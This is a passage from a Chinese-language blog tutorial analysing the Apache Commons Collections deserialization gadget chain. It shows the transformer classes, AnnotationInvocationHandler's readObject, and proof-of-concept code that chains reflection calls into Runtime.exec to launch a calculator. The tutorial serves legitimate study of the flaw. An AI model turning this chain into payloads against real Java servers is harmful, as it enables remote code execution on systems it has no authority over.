class=\"line\">            //初始化Runtime类</span><br><span class=\"line\">            Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class=\"line\">            // 调用Runtime类中的getRuntime方法得到Runtime类的对象</span><br><span class=\"line\">            Object rt = clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz);</span><br><span class=\"line\">            //再次使用invoke调用Runtime类中的方法时，传递我们获得的对象，这样就可以调用</span><br><span class=\"line\">            clazz.getMethod(&quot;exec&quot;,String.class).invoke(rt,&quot;calc&quot;);</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>详细的上面有详细解释，具体可以看上面</p>\n<h4 id=\"利用链1\"><a class=\"markdownIt-Anchor\" href=\"#利用链1\">#</a> 利用链 1</h4>\n<p>关键类：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">InvokeTransformer</span><br><span class=\"line\">利用Java反射机制来创建类实例</span><br><span class=\"line\"></span><br><span class=\"line\">ChainedTransformer</span><br><span class=\"line\">实现了Transformer链式调用，我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform()方法</span><br><span class=\"line\"></span><br><span class=\"line\">ConstantTransformer</span><br><span class=\"line\">transform()返回构造函数的对象</span><br><span class=\"line\"></span><br><span class=\"line\">TransformedMap</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120171605414.png\" alt=\"image-20221120171605414\"></p>\n<p><strong>1.InvokerTransformer</strong></p>\n<p>这个 transform (Object input) 中使用 Java 反射机制调用了 input 对象的一个方法，而该方法名是实例化 InvokerTransformer 类时传入的 iMethodName 成员变量：</p>\n<p>功能函数 transform 需要传入一个对象，然后执行构造函数中给定的方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">InvokerTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Transformer</span>, Serializable &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> -<span class=\"number\">8653385846894047688L</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> String iMethodName;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Class[] iParamTypes;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Object[] iArgs;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">transform</span><span class=\"params\">(Object input)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (input == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">Class</span> <span class=\"variable\">cls</span> <span class=\"operator\">=</span> input.getClass();</span><br><span class=\"line\">                <span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> cls.getMethod(<span class=\"built_in\">this</span>.iMethodName, <span class=\"built_in\">this</span>.iParamTypes);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> method.invoke(input, <span class=\"built_in\">this</span>.iArgs);    <span class=\"comment\">//以上三句获取对象，得到方法，执行方法</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FunctorException</span>(<span class=\"string\">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class=\"built_in\">this</span>.iMethodName + <span class=\"string\">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class=\"string\">&quot;&#x27; does not exist&quot;</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IllegalAccessException var6) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FunctorException</span>(<span class=\"string\">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class=\"built_in\">this</span>.iMethodName + <span class=\"string\">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class=\"string\">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InvocationTargetException var7) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FunctorException</span>(<span class=\"string\">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class=\"built_in\">this</span>.iMethodName + <span class=\"string\">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class=\"string\">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>测试代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * InvokerTransformer反射触发</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TransTest1</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span>  &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 创建实例 传入构造方法参数 （函数名 参数类型 参数值）</span></span><br><span class=\"line\">        <span class=\"type\">InvokerTransformer</span> <span class=\"variable\">invokerTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(</span><br><span class=\"line\">                <span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;Calc.exe&quot;</span>&#125;</span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 通过反射机制依次获得Runtime类 getRuntime构造方法 最后生成Runtime实例</span></span><br><span class=\"line\">            <span class=\"comment\">// Object input = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class=\"line\">            <span class=\"type\">Object</span> <span class=\"variable\">input</span> <span class=\"operator\">=</span> Runtime.getRuntime();</span><br><span class=\"line\">                    <span class=\"comment\">// 执行transform函数</span></span><br><span class=\"line\">            invokerTransformer.transform(input);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>2.ChainedTransformer</strong></p>\n<p>这个类创建实例时，需要传入一个 Transformer 数组，该类的功能就是遍历执行 Transformer 数组的 transform 函数，并且将上一次的 transform 函数的执行结果作为下一次 transform 的输入</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ChainedTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Transformer</span>, Serializable &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">3514945074733160196L</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Transformer[] iTransformers;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ChainedTransformer</span><span class=\"params\">(Transformer[] transformers)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.iTransformers = transformers;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">transform</span><span class=\"params\">(Object object)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">this</span>.iTransformers.length; ++i) &#123;</span><br><span class=\"line\">            object = <span class=\"built_in\">this</span>.iTransformers[i].transform(object);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> object;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><strong>3.ConstantTransformer</strong></p>\n<p>这个类的作用就是保存一个对象而已，创建实例时需要传入一个需要保存的对象，调用实例的 transform 即可获得其中的对象</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ConstantTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Transformer</span>, Serializable &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">6374440726369055124L</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Transformer</span> <span class=\"variable\">NULL_INSTANCE</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>((Object)<span class=\"literal\">null</span>);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Object iConstant;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ConstantTransformer</span><span class=\"params\">(Object constantToReturn)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.iConstant = constantToReturn;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//核心代码</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">transform</span><span class=\"params\">(Object input)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.iConstant;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">getConstant</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.iConstant;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>到这里，三个 Transformer 其实就可以连接起来了，先创建一个 Transformer 数组，用 ConstantTransformer 起手，传入一个对象，用 InvokeTransformer 一步一步调用函数，再将数组传入 ChainedTransformer，调用其 transform 函数。</p>\n<p>测试代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * ChainedTransformer遍历触发</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   等同于 ((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null)).exec(&quot;calc.exe&quot;);</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TransTest2</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"comment\">// 获得Runtime类对象</span></span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"comment\">// 传入Runtime类对象 反射执行getMethod获得getRuntime方法</span></span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(</span><br><span class=\"line\">                        <span class=\"string\">&quot;getMethod&quot;</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[<span class=\"number\">0</span>]&#125;</span><br><span class=\"line\">                ),</span><br><span class=\"line\">                <span class=\"comment\">// 传入getRuntime方法 反射执行invoke方法 得到Runtime实例</span></span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123;Object.class, Object[].class &#125;,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[] &#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span> &#125;</span><br><span class=\"line\">                ),</span><br><span class=\"line\">                <span class=\"comment\">// 传入Runtime实例 执行exec方法</span></span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123;String.class &#125;,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[] &#123;<span class=\"string\">&quot;Calc.exe&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// ChainedTransformer</span></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        chainedTransformer.transform(<span class=\"literal\">null</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>4.TransformedMap</strong></p>\n<p>TransformedMap 这个类中封装了一个 decorate 方法，它是用来修饰 Java 中的标准数据结构 Map，当向被修饰过的 Map 中添加新元素时，它就会执行一个回调函数；这个回调并不是传统意义上的回调函数，而是相当于执行一个对象里面的 transform 方法，前提是这个对象的类要实现了 Transformer 接口。</p>\n<p>key 和 value 都是 transform 的子类，keyTransformer 是处理新元素的 Key 的回调，valueTransformer 是处理新元素的 value 的回调，当我们向 outerMap 中添加新元素时，它就会调用 keyTransformer 或者 valueTransformer 里面的 transform 方法。</p>\n<p>checkSetValue 自动执行 value 中的 transform 子类对象</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TransformedMap</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractInputCheckedMapDecorator</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">7023152376788900464L</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> Transformer keyTransformer;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> Transformer valueTransformer;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Map <span class=\"title function_\">decorate</span><span class=\"params\">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"title function_\">TransformedMap</span><span class=\"params\">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(map);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.keyTransformer = keyTransformer;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.valueTransformer = valueTransformer;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">protected</span> Object <span class=\"title function_\">checkSetValue</span><span class=\"params\">(Object value)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.valueTransformer.transform(value);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><strong>5.AbstractInputCheckedMapDecorator</strong></p>\n<p>通过 setValue 调用 checkSetValue</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractInputCheckedMapDecorator</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractMapDecorator</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"title function_\">AbstractInputCheckedMapDecorator</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MapEntry</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractMapEntryDecorator</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"title function_\">MapEntry</span><span class=\"params\">(Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">super</span>(entry);</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.parent = parent;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> Object <span class=\"title function_\">setValue</span><span class=\"params\">(Object value)</span> &#123;</span><br><span class=\"line\">            value = <span class=\"built_in\">this</span>.parent.checkSetValue(value);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.entry.setValue(value);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>map 中的元素在增加删除修改的时候会调用 setValue 方法</p>\n<p><strong>6.AnnotationInvocationHandler</strong></p>\n<p>重写了 readobject，调用了 setValue 方法进行了键值修改</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">readObject</span><span class=\"params\">(java.io.ObjectInputStream s)</span></span><br><span class=\"line\">    <span class=\"keyword\">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">    ObjectInputStream.<span class=\"type\">GetField</span> <span class=\"variable\">fields</span> <span class=\"operator\">=</span> s.readFields();</span><br><span class=\"line\"></span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.io.InvalidObjectException(<span class=\"string\">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class=\"line\">    <span class=\"comment\">// consistent with runtime Map type</span></span><br><span class=\"line\">    Map&lt;String, Object&gt; mv = <span class=\"keyword\">new</span> <span class=\"title class_\">LinkedHashMap</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// If there are annotation members without values, that</span></span><br><span class=\"line\">    <span class=\"comment\">// situation is handled by the invoke method.</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> memberValue.getKey();</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (memberType != <span class=\"literal\">null</span>) &#123;  <span class=\"comment\">// i.e. member still exists</span></span><br><span class=\"line\">            value = memberValue.getValue();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!(memberType.isInstance(value) ||</span><br><span class=\"line\">                  value <span class=\"keyword\">instanceof</span> ExceptionProxy)) &#123;</span><br><span class=\"line\">                  memberValue.setValue(</span><br><span class=\"line\">                \t<span class=\"keyword\">new</span> <span class=\"title class_\">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class=\"line\">                        value.getClass() + <span class=\"string\">&quot;[&quot;</span> + value + <span class=\"string\">&quot;]&quot;</span>).setMember(</span><br><span class=\"line\">                            annotationType.members().get(name)));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此时如果某台服务器上，开了一个服务，接受 java 序列化字节码，并且使用 ObjectInputStream.readObject 方法进行反序列化，那么我们构造的恶意代码就可以执行</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTEvYXJ0aWNsZS9kZXRhaWxzLzEwNjE2MDE4Mg==\">(70 条消息) 漫谈 Commons-Collections 反序列化_夏日清 1 的博客 - CSDN 博客</span></p>\n<p><span class=\"exturl\" 